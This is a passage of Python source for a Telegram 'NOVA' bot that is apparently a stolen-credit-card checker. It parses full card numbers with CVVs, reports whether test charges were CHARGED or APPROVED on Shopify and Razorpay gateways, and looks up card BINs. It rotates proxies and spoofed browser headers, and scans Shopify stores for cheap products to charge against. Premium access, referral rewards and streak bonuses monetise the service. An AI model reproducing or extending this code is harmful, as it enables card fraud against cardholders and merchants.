    _db.increment_charged(user_id)


def count_successful_checks(user_id: int) -> int:
    return _db.get_charged_count(user_id)


# =============================================================================
# SETTINGS (DB-backed)
# =============================================================================
def load_settings() -> dict:
    s = _db.load_settings()
    return {
        "maintenance": bool(s.get("maintenance", False)),
        "threshold":   float(s.get("threshold", 7.00)),
        "min_price":   float(s.get("min_price", 0.01)),
    }


def save_settings(data: dict):
    _db.save_settings(data)


_MAINT_CACHE = {"v": False, "ts": 0.0}


def get_maintenance() -> bool:
    now = time.time()
    if now - _MAINT_CACHE["ts"] < 30:
        return _MAINT_CACHE["v"]
    v = bool(_db.load_settings().get("maintenance", False))
    _MAINT_CACHE["v"] = v
    _MAINT_CACHE["ts"] = now
    return v


def set_maintenance(enabled: bool):
    s = dict(_db.load_settings())
    s["maintenance"] = bool(enabled)
    _db.save_settings(s)
    _MAINT_CACHE["v"] = bool(enabled)
    _MAINT_CACHE["ts"] = time.time()


def get_threshold() -> float:
    return float(_db.load_settings().get("threshold", 7.00))


def set_threshold(val: float):
    s = dict(_db.load_settings())
    s["threshold"] = float(val)
    _db.save_settings(s)


def get_min_price() -> float:
    return float(_db.load_settings().get("min_price", 0.01))


def set_min_price(val: float):
    s = dict(_db.load_settings())
    s["min_price"] = float(val)
    _db.save_settings(s)


# =============================================================================
# FORCE-JOIN
# =============================================================================
FORCE_JOIN_CHATS = [
    (FORCE_JOIN_GROUP_ID,   "Group",   GROUP_INVITE_LINK),
    (FORCE_JOIN_CHANNEL_ID, "Channel", CHANNEL_INVITE_LINK),
]

_JOIN_CACHE = {}
_JOIN_CACHE_TTL = 600


async def _is_in_chat(user_id: int, chat_id: int):
    from telethon.tl.functions.channels import GetParticipantRequest
    from telethon.errors import (
        UserNotParticipantError, ChannelPrivateError,
        ChatAdminRequiredError, UserIdInvalidError,
    )
    if not chat_id:
        return None
    try:
        await client_instance(GetParticipantRequest(channel=chat_id, participant=user_id))
        return True
    except UserNotParticipantError:
        return False
    except (ChannelPrivateError, ChatAdminRequiredError):
        return None
    except UserIdInvalidError:
        return False
    except Exception as e:
        log_system("FORCE_JOIN", f"unexpected error chat {chat_id}: {e!r}", "warning")
        return None


async def is_user_joined(user_id: int) -> bool:
    if user_id in ADMIN_ID:
        return True
    now = time.time()
    cached_at = _JOIN_CACHE.get(user_id)
    if cached_at and now - cached_at < _JOIN_CACHE_TTL:
        return True
    results = await asyncio.gather(
        _is_in_chat(user_id, FORCE_JOIN_CHATS[0][0]),
        _is_in_chat(user_id, FORCE_JOIN_CHATS[1][0]),
        return_exceptions=True,
    )
    for r in results:
        if r is False:
            return False
    _JOIN_CACHE[user_id] = now
    return True


async def send_join_required_message(event):
    rows = []
    for _cid, name, link in FORCE_JOIN_CHATS:
        if link:
            rows.append([pbtn(bs(f"📢 Join {name}"), url=link,
                              style="primary", icon="📢")])
    rows.append([pbtn(bs("✅ I Joined"), data="check_joined",
                      style="success", icon="✅")])
    text = pe(f"""💎 <b>{bs('Access Locked')}</b>
{SEP}
🔐 {bs('Join both chats to continue')}
{SEP}""")
    await styled_reply(event, text, buttons=rows)


async def force_join_check(event) -> bool:
    if event.sender_id in ADMIN_ID:
        return True
    if await is_user_joined(event.sender_id):
        return True
    await send_join_required_message(event)
    return False


async def check_maintenance(event) -> bool:
    if get_maintenance() and event.sender_id not in ADMIN_ID:
        await styled_reply(event, pe(f"""💎 <b>{bs('Maintenance')}</b>
{SEP}
⚙️ <b>{bs('Bot under maintenance')}</b>
⏰ <i>{bs('Try again later')}</i>"""))
        return True
    return False


async def send_premium_only(event):
    return await styled_reply(event, pe(f"""💎 <b>{bs('Premium only')}</b>
{SEP}
👑 {bs('This command requires premium access')}
🔑 <i>{bs('Redeem a key or contact admin')}</i>"""),
        buttons=[[pbtn(bs("📩 Contact"), url=f"https://t.me/{OWNER_TAG.lstrip('@')}",
                       style="success", icon="📩")]])


async def send_group_only(event):
    return await styled_reply(event, pe(f"""💎 <b>{bs('Group only')}</b>
{SEP}
👥 {bs('Free users can only use in group')}
💎 <i>{bs('Upgrade for private access')}</i>"""))


# =============================================================================
# FREE-TIER TRACKER
# =============================================================================
_FREE_USAGE = {}
_FREE_LAST = {}


def _today():
    return datetime.now().strftime("%Y-%m-%d")


def get_free_usage(user_id: int) -> int:
    e = _FREE_USAGE.get(user_id)
    if not e or e.get("date") != _today():
        _FREE_USAGE[user_id] = {"date": _today(), "count": 0}
        return 0
    return e["count"]


def inc_free_usage(user_id: int):
    e = _FREE_USAGE.get(user_id)
    if not e or e.get("date") != _today():
        _FREE_USAGE[user_id] = {"date": _today(), "count": 1}
    else:
        e["count"] += 1


def free_cooldown_left(user_id: int) -> float:
    last = _FREE_LAST.get(user_id, 0)
    elapsed = time.time() - last
    if elapsed >= FREE_COOLDOWN_SEC:
        return 0.0
    return round(FREE_COOLDOWN_SEC - elapsed, 1)


def set_free_last(user_id: int):
    _FREE_LAST[user_id] = time.time()


# =============================================================================
# PREMIUM DAILY
# =============================================================================
_PREMIUM_DAILY = {}


def get_premium_daily_used(uid):
    e = _PREMIUM_DAILY.get(uid, {})
    if e.get("date") != _today():
        return 0
    return e.get("count", 0)


def inc_premium_daily_used(uid):
    today = _today()
    e = _PREMIUM_DAILY.get(uid, {})
    if e.get("date") != today:
        _PREMIUM_DAILY[uid] = {"date": today, "count": 1}
    else:
        e["count"] += 1
        _PREMIUM_DAILY[uid] = e


def get_premium_daily_limit(uid):
    return _db.get_user_limit(uid)


# =============================================================================
# GLOBAL STATE
# =============================================================================
ACTIVE_SESSIONS = {}
SHOPIFY_RESULTS = {}
RAZORPAY_RESULTS = {}
BOT_START_TIME = time.time()


# =============================================================================
# VIDEO SYSTEM
# =============================================================================
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
VIDEO_DIR = os.path.join(BASE_DIR, "videos")
os.makedirs(VIDEO_DIR, exist_ok=True)


def get_welcome_video():
    p = os.path.join(VIDEO_DIR, "welcome.mp4")
    return p if os.path.exists(p) else None


def get_hit_videos():
    try:
        return [os.path.join(VIDEO_DIR, f)
                for f in sorted(os.listdir(VIDEO_DIR))
                if f.startswith("hit") and f.endswith(".mp4")]
    except Exception:
        return []


def _pick_hit_video():
    vids = get_hit_videos()
    return random.choice(vids) if vids else None


# =============================================================================
# CARD FORMATTING
# =============================================================================
def _bin_lines(bin_tuple):
    brand, typ, level, bank, country, flag = bin_tuple
    return (
        f"🏦 {bs('BIN')} ━ <code>{brand} - {typ} - {level}</code>\n"
        f"🏛 {bs('Bank')} ━ <code>{bank}</code>\n"
        f"🌍 {bs('Country')} ━ <code>{country} {flag}</code>"
    )


def _status_header(status: str):
    s = (status or '').upper()
    if s == 'CHARGED':  return f"🥇 <b>{bs('CHARGED')}</b>"
    if s == 'APPROVED': return f"🥈 <b>{bs('APPROVED')}</b>"
    if s == '3DS':      return f"🥉 <b>{bs('3DS')}</b>"
    if s == 'DECLINED': return f"🥔 <b>{bs('DECLINED')}</b>"
    if s == 'ERROR':    return f"🧨 <b>{bs('ERROR')}</b>"
    return f"⚪ <b>{bs(s or 'UNKNOWN')}</b>"


def format_shopify_single(result: dict, bin_tuple, elapsed: float) -> str:
    card = result.get('card', '-')
    gateway = result.get('gateway', 'Shopify')
    response = (result.get('message') or '')[:150]
    price = result.get('price', '-')
    status = result.get('status', 'Dead').upper()
    if status == 'DEAD':
        status = 'DECLINED'
    return pe(f"""{_status_header(status)}
{SEP}
💳 {bs('Card')} ━ <code>{card}</code>
🛒 {bs('Gateway')} ━ <code>{gateway}</code>
📝 {bs('Response')} ━ <code>{response}</code>
💰 {bs('Price')} ━ <code>{price}</code>
{SEP}
{_bin_lines(bin_tuple)}
{SEP}
⏱ {bs('Took')} ━ <code>{elapsed:.2f}s</code>""")


def format_realtime_hit(result: dict, gateway_type: str, bin_tuple) -> str:
    card = result.get('card', '-')
    gateway = result.get('gateway', 'Shopify')
    response = (result.get('message') or '')[:150]
    price = result.get('price', '-')
    status = result.get('status', 'Dead').upper()
    if status == 'DEAD':
        status = 'DECLINED'
    return pe(f"""{_status_header(status)}

💳 {bs('CC')} <code>{card}</code>

🛒 {bs('Gateway')} {gateway}
📝 {bs('Response')} {response}
💸 {bs('Price')} {price}

🆔 {bs('BIN Info')} {bin_tuple[0]} - {bin_tuple[1]} - {bin_tuple[2]}
🏦 {bs('Bank')} {bin_tuple[3]}
🥰 {bs('Country')} {bin_tuple[4]} {bin_tuple[5]}""")


HIT_BUTTON = [[pbtn(bs("💎 NOVA"), url="http://t.me/spectrumxchkbot",
                    style="primary", icon="💎")]]


# =============================================================================
# BIN LOOKUP
# =============================================================================
_BIN_CACHE = {}


async def _bin_lookup_antipublic(bin6, session):
    try:
        async with session.get(
            f"https://bins.antipublic.cc/bins/{bin6}",
            timeout=aiohttp.ClientTimeout(total=6),
        ) as r:
            if r.status != 200:
                return None
            data = await r.json(content_type=None)
            if not isinstance(data, dict) or not data.get("bin"):
                return None
            return (
                (data.get("brand") or "-").upper(),
                (data.get("type") or "-").upper(),
                (data.get("level") or "-").upper(),
                data.get("bank") or "-",
                data.get("country_name") or "-",
                data.get("country_flag") or "",
            )
    except Exception:
        return None


async def _bin_lookup_binlist(bin6, session):
    try:
        async with session.get(
            f"https://lookup.binlist.net/{bin6}",
            headers={"Accept-Version": "3"},
            timeout=aiohttp.ClientTimeout(total=6),
        ) as r:
            if r.status != 200:
                return None
            data = await r.json(content_type=None)
            scheme = data.get("scheme", "-") or "-"
            typ = data.get("type", "-") or "-"
            brand = data.get("brand", "-") or "-"
            bank = (data.get("bank") or {}).get("name", "-") or "-"
            country = (data.get("country") or {}).get("name", "-") or "-"
            flag = (data.get("country") or {}).get("emoji", "") or ""
            return (
                scheme.upper(), typ.upper(), brand.upper(), bank, country, flag,
            )
    except Exception:
        return None


async def get_bin_info_cached(card_number, session):
    cn = card_number[:6] if card_number else ""
    if not cn or len(cn) < 6:
        return ("-", "-", "-", "-", "-", "")
    if cn in _BIN_CACHE:
        return _BIN_CACHE[cn]
    result = await _bin_lookup_antipublic(cn, session)
    if not result:
        result = await _bin_lookup_binlist(cn, session)
    if result:
        _BIN_CACHE[cn] = result
        return result
    return ("-", "-", "-", "-", "-", "")


async def get_bin_info(card_number: str):
    return await get_bin_info_cached(card_number, await get_bin_session())


# =============================================================================
# UTILITIES
# =============================================================================
def extract_cc(text: str) -> list:
    if not text:
        return []
    cards = []
    for c, m, y, cv in re.findall(
        r'(\d{15,16})[\s|/\\:]+(\d{1,2})[\s|/\\:]+(\d{2,4})[\s|/\\:]+(\d{3,4})', text):
        if len(y) == 2:
            y = '20' + y
        cards.append(f"{c}|{m.zfill(2)}|{y}|{cv}")
    if not cards:
        for c, m, y, cv in re.findall(
            r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{4})(\d{3,4})', text):
            cards.append(f"{c}|{m}|{y}|{cv}")
    return list(dict.fromkeys(cards))


def is_valid_url_or_domain(url: str) -> bool:
    d = url.lower()
    if d.startswith(('http://', 'https://')):
        try:
            d = urlparse(url).netloc
        except Exception:
            return False
    return bool(re.match(
        r'^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$',
        d))


def normalize_site_url(url: str) -> str:
    url = url.strip().lower()
    url = re.sub(r'^https?://', '', url).rstrip('/')
    if url.startswith('www.'):
        url = url[4:]
    if '/' in url:
        url = url.split('/')[0]
    return url


def normalize_rz_url(url: str) -> str:
    url = url.strip()
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    return url.rstrip('/')


def extract_urls(text: str) -> list:
    seen, result = set(), []
    for line in text.split('\n'):
        line = line.strip()
        if not line:
            continue
        m = re.match(r'(https?://[^\s{(]+)', line)
        if m:
            n = normalize_site_url(m.group(1).rstrip('/'))
            if n and is_valid_url_or_domain(n) and n not in seen:
                seen.add(n); result.append(n)
            continue
        cleaned = re.sub(r'^[\s\-\+\|,\d\.\)\(\[\]]+', '', line).split(' ')[0].split('{')[0].strip()
        if cleaned:
            n = normalize_site_url(cleaned)
            if n and is_valid_url_or_domain(n) and n not in seen:
                seen.add(n); result.append(n)
    return result


def parse_proxy_format(proxy: str):
    proxy = proxy.strip()
    pt = 'http'
    m = re.match(r'^(socks5|socks4|http|https)://(.+)$', proxy, re.IGNORECASE)
    if m:
        pt, proxy = m.group(1).lower(), m.group(2)
    h = p = u = pw = ''
    m = re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy)
    if m:
        u, pw, h, p = m.groups()
    elif re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy):
        m2 = re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy)
        ph, pp, pu, ppw = m2.groups()
        try:
            if 0 < int(pp) <= 65535:
                h, p, u, pw = ph, pp, pu, ppw
        except Exception:
            return None
    elif re.match(r'^([^:@]+):(\d+)$', proxy):
        m3 = re.match(r'^([^:@]+):(\d+)$', proxy)
        h, p = m3.groups()
    else:
        return None
    if not h or not p:
        return None
    try:
        if not (0 < int(p) <= 65535):
            return None
    except Exception:
        return None
    return {'ip': h, 'port': p, 'username': u or None,
            'password': pw or None, 'type': pt}


def proxy_to_url(proxy: str) -> str:
    p = parse_proxy_format(proxy)
    if not p:
        return f'http://{proxy}'
    if p['username'] and p['password']:
        return f"{p['type']}://{p['username']}:{p['password']}@{p['ip']}:{p['port']}"
    return f"{p['type']}://{p['ip']}:{p['port']}"


# =============================================================================
# HTTP SESSIONS
# =============================================================================
_GLOBAL_HTTP = None
_GLOBAL_BIN  = None
_GLOBAL_PROXY = None


async def get_http_session():
    global _GLOBAL_HTTP
    if _GLOBAL_HTTP is None or _GLOBAL_HTTP.closed:
        _GLOBAL_HTTP = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=45, connect=10),
            connector=aiohttp.TCPConnector(
                limit=500, limit_per_host=200,
                ttl_dns_cache=600, use_dns_cache=True,
                enable_cleanup_closed=True,
            ),
        )
    return _GLOBAL_HTTP


async def get_bin_session():
    global _GLOBAL_BIN
    if _GLOBAL_BIN is None or _GLOBAL_BIN.closed:
        _GLOBAL_BIN = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=10),
            connector=aiohttp.TCPConnector(limit=100, ttl_dns_cache=300),
        )
    return _GLOBAL_BIN


async def get_proxy_session():
    global _GLOBAL_PROXY
    if _GLOBAL_PROXY is None or _GLOBAL_PROXY.closed:
        _GLOBAL_PROXY = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=30, connect=20),
            connector=aiohttp.TCPConnector(limit=100, ttl_dns_cache=300),
        )
    return _GLOBAL_PROXY


# =============================================================================
# PER-USER SEMAPHORES
# =============================================================================
_USER_SEMS = {}


def get_user_sem(uid, t="msp"):
    key = (uid, t)
    sem = _USER_SEMS.get(key)
    if sem is None:
        limits = {
            "sp": SP_PER_USER_WORKERS,
            "msp": MSP_PER_USER_WORKERS,
            "proxy": PROXY_PER_USER_WORKERS,
            "site": SITE_PER_USER_WORKERS,
            "harvest": HARVEST_PER_USER_WORKERS,
        }
        sem = asyncio.Semaphore(limits.get(t, 20))
        _USER_SEMS[key] = sem
    return sem


def cleanup_user_sem(uid):
    for k in [k for k in list(_USER_SEMS.keys()) if k[0] == uid]:
        _USER_SEMS.pop(k, None)


# =============================================================================
# SMART ROTATOR
# =============================================================================
class SmartRotator:
    def pick_site(self, sites, exclude=None):
        exclude = exclude or set()
        available = [s for s in sites if s not in exclude] or sites
        return random.choice(available) if available else None

    def pick_proxy(self, proxies, exclude=None):
        exclude = exclude or set()
        available = [p for p in proxies if p not in exclude] or proxies
        return random.choice(available) if available else None


def build_status_text():
    if not PSUTIL_AVAILABLE:
        return pe(f"💎 <b>{bs('Status')}</b>\n{SEP}\n⚠️ <i>psutil unavailable</i>")
    try:
        cpu = psutil.cpu_percent(interval=0.5)
        mem = psutil.virtual_memory()
        disk = psutil.disk_usage('/')
        uptime_sec = time.time() - BOT_START_TIME
        h, m, s = int(uptime_sec // 3600), int((uptime_sec % 3600) // 60), int(uptime_sec % 60)
        return pe(f"""💎 <b>{bs('System Status')}</b>
{SEP}
💻 {bs('CPU')}: <code>{cpu}%</code>
🧠 {bs('RAM')}: <code>{mem.percent}%</code>
💾 {bs('Disk')}: <code>{disk.percent}%</code>
⏰ {bs('Uptime')}: <code>{h}h {m}m {s}s</code>
{SEP}
🤖 {bs('NOVA Bot Online')}""")
    except Exception as e:
        return pe(f"💎 <b>{bs('Status error')}</b>: <code>{e}</code>")


# =============================================================================
# REFERRALS (DB-backed)
# =============================================================================
def load_referrals() -> dict:
    users: dict = {}
    codes: dict = {}
    try:
        for d in _db.list_referral_users(5000):
            try:
                uid = d.pop("_id")
                users[str(uid)] = d
            except Exception:
                continue
    except Exception:
        pass
    try:
        for d in _db.list_referral_codes(5000):
            try:
                codes[d["_id"]] = str(d["user_id"])
            except Exception:
                continue
    except Exception:
        pass
    return {"users": users, "codes": codes}


def save_referrals(data: dict):
    if not isinstance(data, dict):
        return
    for uid_str, u in data.get("users", {}).items():
        try:
            _db.save_referral_user(int(uid_str), u)
        except Exception:
            continue
    for code, uid_str in data.get("codes", {}).items():
        try:
            _db.save_referral_code(code, int(uid_str))
        except Exception:
            continue


def _gen_ref_code(user_id: int) -> str:
    base = f"NOVA{user_id}{time.time()}{random.random()}"
    h = hashlib.sha1(base.encode()).hexdigest().upper()
    return "NOVA" + h[:6]


def get_or_create_ref_code(user_id: int) -> str:
    existing = _db.get_referral_user(user_id)
    if existing and existing.get("code"):
        return existing["code"]
    code = _gen_ref_code(user_id)
    while _db.find_referral_by_code(code) is not None:
        code = _gen_ref_code(user_id + random.randint(1, 9999999))
    _db.save_referral_user(user_id, {
        "code": code, "referred_by": None, "referrals": [],
        "pending": [], "rewarded": [], "milestones_paid": 0,
        "total_hours_earned": 0, "total_cc_upgrades": 0,
        "created_at": datetime.now().isoformat(),
    })
    _db.save_referral_code(code, user_id)
    return code


def find_user_by_code(code: str):
    return _db.find_referral_by_code(code or "")


def attach_referral(new_user_id: int, ref_code: str) -> bool:
    if not ref_code:
        return False
    inviter_id = find_user_by_code(ref_code)
    if not inviter_id or inviter_id == new_user_id:
        return False
    data = load_referrals()
    new_uid = str(new_user_id)
    inv_uid = str(inviter_id)
    if new_uid in data["users"] and data["users"][new_uid].get("referred_by"):
        return False
    if new_uid not in data["users"]:
        get_or_create_ref_code(new_user_id)
        data = load_referrals()
    if inv_uid not in data["users"]:
        get_or_create_ref_code(inviter_id)
        data = load_referrals()
    data["users"][new_uid]["referred_by"] = inviter_id
    inviter = data["users"][inv_uid]
    if new_user_id not in inviter.get("pending", []):
        inviter.setdefault("pending", []).append(new_user_id)
    save_referrals(data)
    return True


def maybe_pay_milestone(new_user_id: int):
    if REFERRAL_MIN_CHECKS > 0 and count_successful_checks(new_user_id) < REFERRAL_MIN_CHECKS:
        return None
    data = load_referrals()
    new_uid = str(new_user_id)
    u = data["users"].get(new_uid)
    if not u:
        return None
    inviter_id = u.get("referred_by")
    if not inviter_id:
        return None
    inv_uid = str(inviter_id)
    inviter = data["users"].get(inv_uid)
    if not inviter:
        return None
    pending = inviter.get("pending", [])
    rewarded = inviter.get("rewarded", [])
    if new_user_id in rewarded or new_user_id not in pending:
        return None
    inviter["pending"] = [x for x in pending if x != new_user_id]
    inviter.setdefault("rewarded", []).append(new_user_id)
    inviter.setdefault("referrals", []).append(new_user_id)
    inviter["referrals"] = list(dict.fromkeys(inviter["referrals"]))
    total_confirmed = len(inviter["rewarded"])
    if total_confirmed > REFERRAL_MAX_PER_USER:
        save_referrals(data)
        return None
    every = REFERRAL_MILESTONE_EVERY
    paid_already = int(inviter.get("milestones_paid", 0))
    milestones_due = total_confirmed // every
    milestone_fired = False
    if milestones_due > paid_already:
        _grant_milestone(inviter_id, REFERRAL_MILESTONE_HOURS,
                         REFERRAL_MILESTONE_CC_LIMIT)
        inviter["milestones_paid"] = paid_already + 1
        inviter["total_hours_earned"] = (
            int(inviter.get("total_hours_earned", 0)) + REFERRAL_MILESTONE_HOURS
        )
        inviter["total_cc_upgrades"] = int(inviter.get("total_cc_upgrades", 0)) + 1
        milestone_fired = True
    save_referrals(data)
    if milestone_fired:
        return {
            "inviter_id": inviter_id,
            "hours": REFERRAL_MILESTONE_HOURS,
            "cc_limit": REFERRAL_MILESTONE_CC_LIMIT,
            "total_confirmed": total_confirmed,
            "milestones_paid": inviter["milestones_paid"],
            "next_milestone_at": (inviter["milestones_paid"] + 1) * every,
        }
    return None


def referral_stats(user_id: int) -> dict:
    get_or_create_ref_code(user_id)
    data = load_referrals()
    u = data["users"].get(str(user_id), {})
    confirmed = len(u.get("rewarded", []))
    pending = len(u.get("pending", []))
    every = REFERRAL_MILESTONE_EVERY
    paid = int(u.get("milestones_paid", 0))
    to_next = (every - (confirmed % every)) if (confirmed % every) else every
    return {
        "code": u.get("code", ""),
        "confirmed": confirmed,
        "pending": pending,
        "total": confirmed + pending,
        "milestones_paid": paid,
        "next_milestone_in": to_next,
        "total_hours": int(u.get("total_hours_earned", 0)),
        "cc_upgrades": int(u.get("total_cc_upgrades", 0)),
        "referred_by": u.get("referred_by"),
    }


def reset_referrals_for_user(user_id: int):
    data = load_referrals()
    uid = str(user_id)
    if uid not in data["users"]:
        return False
    u = data["users"][uid]
    u["pending"] = []
    u["rewarded"] = []
    u["referrals"] = []
    u["milestones_paid"] = 0
    u["total_hours_earned"] = 0
    u["total_cc_upgrades"] = 0
    save_referrals(data)
    return True


# =============================================================================
# STREAK (DB-backed)
# =============================================================================
def _today_str() -> str:
    return datetime.now().strftime("%Y-%m-%d")


def _yesterday_str() -> str:
    return (datetime.now() - timedelta(days=1)).strftime("%Y-%m-%d")


def update_streak(user_id: int) -> dict:
    now = datetime.now()
    entry = _db.get_streak(user_id) or {
        "current": 0, "best": 0, "last_date": None, "last_ts": 0,
        "total_checks": 0, "milestones_claimed": [],
    }
    entry = dict(entry)
    entry.pop("_id", None)
    entry["total_checks"] = int(entry.get("total_checks", 0)) + 1
    today = _today_str()
    yesterday = _yesterday_str()
    last_date = entry.get("last_date")
    last_ts = float(entry.get("last_ts", 0) or 0)
    hours_since = (now.timestamp() - last_ts) / 3600.0 if last_ts else 999
    reward_info = None
    if last_date == today:
        pass
    elif last_date == yesterday and hours_since <= STREAK_MAX_GAP_HOURS:
        entry["current"] = int(entry.get("current", 0)) + 1
    elif hours_since < STREAK_MIN_GAP_HOURS and last_date != today:
        pass
    else:
        entry["current"] = 1
    if entry["current"] > int(entry.get("best", 0)):
        entry["best"] = entry["current"]
    entry["last_date"] = today
    entry["last_ts"] = now.timestamp()
    cur = entry["current"]
    if cur in STREAK_MILESTONES and cur not in entry.get("milestones_claimed", []):
        bonus_h = STREAK_MILESTONES[cur]
        _grant_streak_hours(user_id, bonus_h)
        entry.setdefault("milestones_claimed", []).append(cur)
        reward_info = {"day": cur, "hours": bonus_h}
    _db.save_streak(user_id, entry)
    return {"current": entry["current"], "best": entry["best"],
            "total_checks": entry["total_checks"], "reward": reward_info}


def get_streak(user_id: int) -> dict:
    entry = _db.get_streak(user_id) or {}
    return {"current": int(entry.get("current", 0)),
            "best": int(entry.get("best", 0)),
            "last_date": entry.get("last_date"),
            "total_checks": int(entry.get("total_checks", 0)),
            "milestones": entry.get("milestones_claimed", [])}


# =============================================================================
# PROXY TEST
# =============================================================================
async def test_proxy(proxy: str):
    proxy_url = proxy_to_url(proxy)
    session = await get_proxy_session()
    ip = None
    try:
        async with session.get(
            "https://api.ipify.org?format=json",
            proxy=proxy_url,
            timeout=aiohttp.ClientTimeout(total=8, connect=5),
        ) as r:
            if r.status != 200:
                return {"proxy": proxy, "status": "dead",
                        "reason": f"ipify HTTP {r.status}"}
            data = await r.json(content_type=None)
            ip = data.get("ip")
            if not ip or not re.match(r"^\d{1,3}(\.\d{1,3}){3}$", ip):
                return {"proxy": proxy, "status": "dead",
                        "reason": "ipify bad response"}
    except Exception as e:
        return {"proxy": proxy, "status": "dead",
                "reason": f"ipify: {type(e).__name__}"}
    try:
        loop = asyncio.get_running_loop()
        ok = await loop.run_in_executor(
            None, _engine_is_proxy_alive, proxy_url, 6.0
        )
        if not ok:
            return {"proxy": proxy, "status": "dead",
                    "reason": "engine TLS failed"}
    except Exception as e:
        return {"proxy": proxy, "status": "dead",
                "reason": f"engine: {type(e).__name__}"}
    return {"proxy": proxy, "status": "alive", "ip": ip}


# =============================================================================
# FAST SITE PROBE
# =============================================================================
async def test_site_with_price(site: str, proxy: str = None) -> dict:
    if not site:
        return {'site': site, 'status': 'dead', 'price': 0.0,
                'response': 'Empty site'}
    if not proxy:
        return {'site': site, 'status': 'proxy_error', 'price': 0.0,
                'response': 'No proxy'}
    domain = re.sub(r'^https?://', '', site).rstrip('/').split('/')[0]
    if not domain or '.' not in domain:
        return {'site': site, 'status': 'dead', 'price': 0.0,
                'response': 'Invalid domain'}
    proxy_url = proxy_to_url(proxy)
    min_price = get_min_price()
    max_price = get_threshold()
    session = await get_http_session()
    url = f"https://{domain}/products.json?limit=50"
    try:
        kw = {
            "timeout": aiohttp.ClientTimeout(total=8, connect=5),
            "allow_redirects": False,
            "headers": {"User-Agent": random.choice([
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            ])},
            "proxy": proxy_url,
        }
        async with session.get(url, **kw) as r:
            if r.status == 407:
                return {'site': site, 'status': 'proxy_error', 'price': 0.0,
                        'response': 'Proxy auth required (407)'}
            if r.status != 200:
                return {'site': site, 'status': 'dead', 'price': 0.0,
                        'response': f'HTTP {r.status}'}
            body = await r.text()
            if '"products"' not in body:
                return {'site': site, 'status': 'dead', 'price': 0.0,
                        'response': 'Not a Shopify store'}
            try:
                data = json.loads(body)
            except Exception:
                return {'site': site, 'status': 'dead', 'price': 0.0,
                        'response': 'Invalid JSON'}
            prods = data.get("products") or []
            if not prods:
                return {'site': site, 'status': 'dead', 'price': 0.0,
                        'response': 'No products'}
            cheapest = float('inf')
            for p in prods:
                for v in p.get("variants", []) or []:
                    if v.get("available") is False:
                        continue
                    try:
                        pf = float(v.get("price") or 0)
                    except (TypeError, ValueError):
                        continue
                    if pf <= 0:
                        continue
                    if pf < cheapest:
                        cheapest = pf
            if cheapest == float('inf'):
                return {'site': site, 'status': 'dead', 'price': 0.0,
                        'response': 'All out of stock'}
            if cheapest > max_price:
                return {'site': site, 'status': 'over', 'price': cheapest,
                        'response': f'Over ${max_price:.2f}'}
            if cheapest < min_price:
                return {'site': site, 'status': 'dead', 'price': cheapest,
                        'response': f'Below ${min_price:.2f}'}
            return {'site': site, 'status': 'alive', 'price': cheapest,
                    'response': f'${cheapest:.2f} ✓'}
    except asyncio.TimeoutError:
        return {'site': site, 'status': 'proxy_error', 'price': 0.0,
                'response': 'Timeout'}
    except Exception as e:
        err = str(e)
        low = err.lower()
        if any(k in low for k in ('proxy', '407', 'tunnel', 'resolve proxy')):
            return {'site': site, 'status': 'proxy_error', 'price': 0.0,
                    'response': f'Proxy: {err[:50]}'}
        return {'site': site, 'status': 'dead', 'price': 0.0,
                'response': err[:60]}


# =============================================================================
# SITE TEST RUNNER
# =============================================================================
async def _run_site_tests(event, uid, to_test, status_msg, initial_sites_count,
                          existing=None, wipe=False):
    threshold = get_threshold()
    proxies = load_user_proxies(uid)
    if not proxies:
        return await status_msg.edit(pe(f"💎 <b>{bs('Need proxies first')}</b>"))
    sem = get_user_sem(uid, "site")
    alive, dead, over, unknown, proxy_err = [], 0, 0, 0, 0
    checked = 0

    async def _check_one(site):
        nonlocal checked, dead, over, unknown, proxy_err
        proxy_choice = random.choice(proxies)
        clean = _strip_country_from_proxy(proxy_choice)
        async with sem:
            res = await test_site_with_price(site, clean)
        checked += 1
        st = res.get('status')
        if st == 'alive':
            alive.append(site)
        elif st == 'over':
            over += 1
        elif st == 'proxy_error':
            proxy_err += 1
        elif st == 'unknown':
            unknown += 1
        else:
            dead += 1

    try:
        for i in range(0, len(to_test), SITE_PER_USER_WORKERS):
            batch = to_test[i:i + SITE_PER_USER_WORKERS]
            await asyncio.gather(*[_check_one(s) for s in batch])
            try:
                await status_msg.edit(pe(
                    f"💎 <b>{bs('Testing')}</b> [{checked}/{len(to_test)}]\n"
                    f"✅ <code>{len(alive)}</code> │ ❌ <code>{dead}</code> │ "
                    f"🔌 <code>{proxy_err}</code> │ 💰 <code>{over}</code>"
                ), parse_mode='html', link_preview=False)
            except Exception:
                pass

        total_checked = proxy_err + dead + over + len(alive) + unknown
        majority_proxy = (total_checked > 0 and proxy_err >= total_checked)
        if (not wipe) and (proxy_err > 0) and (len(alive) == 0) and (over == 0) and majority_proxy:
            return await status_msg.edit(pe(
                f"🛑 <b>{bs('All requests failed at proxy layer')}</b>\n{SEP}\n"
                f"🔌 {bs('Proxy errors')}: <code>{proxy_err}</code>\n"
                f"❌ {bs('Dead')}: <code>{dead}</code>\n"
                f"💡 {bs('Replace proxies and retry')}"
            ), parse_mode='html', link_preview=False)

        if wipe:
            save_sites(alive)
        elif alive and existing is not None:
            save_sites(list(existing) + alive)

        await status_msg.edit(pe(
            f"✅ <b>{bs('Site check complete')}</b>\n{SEP}\n"
            f"📥 {bs('Received')}: <code>{initial_sites_count}</code>\n"
            f"✅ {bs('Alive')}: <code>{len(alive)}</code>\n"
            f"❌ {bs('Dead')}: <code>{dead}</code>\n"
